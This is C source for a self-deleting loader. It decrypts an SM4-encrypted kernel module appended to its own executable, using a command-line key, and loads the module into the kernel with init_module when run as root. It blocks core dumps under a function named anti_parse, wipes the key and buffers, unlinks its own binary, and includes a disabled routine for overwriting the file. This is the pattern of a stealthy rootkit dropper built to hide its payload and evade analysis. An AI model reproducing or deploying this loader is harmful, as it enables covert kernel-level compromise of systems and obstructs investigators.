#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/resource.h>
#include "sm4.h"

inline int init_module(void *module_image, unsigned long len,
                       const char *param_values)
{
	return syscall(SYS_init_module, module_image, len, param_values);
}

static int read_file(char *buf, char *fname, int len)
{
	int ret = -1;
	int fd = -1;

	fd = open(fname, O_RDONLY);
	if (fd < 0)
		goto end;
	
	ret = read(fd, buf, len);
	if (ret != len) 
		ret = -1;

end:
	if (fd >= 0)
		close(fd);
	return ret;
}

#if 0
static int clear_file(char *fname, int len)
{
	int ret = -1;
	int fd = -1;
	int i = 0;
	int count = 0;
	char zero_buf[4096] = {0};

	fd = open(fname, O_WRONLY);
	if (fd < 0)
		goto end;

	unlink(fname);
	
	count = len/sizeof(zero_buf);
	for (i=0; i<count; i++)
		ret = write(fd, zero_buf, sizeof(zero_buf));

	count = len - count*sizeof(zero_buf);
	for (i=0; i<count; i++)
		ret = write(fd, zero_buf, 1);

	ret = 0;

end:
	if (fd >= 0)
		close(fd);
	return ret;
}
#endif

static int anti_parse(void)
{
	int ret = 0;
	struct rlimit rt = {.rlim_cur = 0, .rlim_max = 0};

	//forbid core
	ret = setrlimit(RLIMIT_CORE, &rt);
	if (ret < 0)
		goto end;
	
	//forbind ptrace
end:
	return ret; 
}

int main(int argc, char **argv)
{
	int ret = -1;
	struct stat st;
	char *buf = NULL;

	char *module_image = NULL;
	int m_size = 51024;
	char *m_params = "";
	char *key = NULL;

	if (anti_parse() < 0)
		goto end;

	if (argc < 2 || argc > 3) {
		fprintf(stderr, "Usage: %s key [module_params]\n", argv[0]);
		return 0;
	}

	if (geteuid() != 0)
		return 0;

	if (argc == 2)
		key = argv[1];

	if (argc == 3)
		m_params = argv[2];
	
	if (stat(argv[0], &st) < 0)
		goto end;

	buf = malloc(st.st_size);
	if (!buf)
		goto end;
	
	if (read_file(buf, argv[0], st.st_size) < 0)
		goto end;

	module_image = buf+(st.st_size-m_size);
	sm4_decrypt_ctr(module_image, m_size, key); 
	memset(key, 0, strlen(key));

	ret = init_module(module_image, m_size, m_params);
	
end:
	if (buf) {
		memset(buf, 0, st.st_size);
		free(buf);
	}
	
	unlink(argv[0]);
	//clear_file(argv[0], st.st_size);

	return ret;	
}
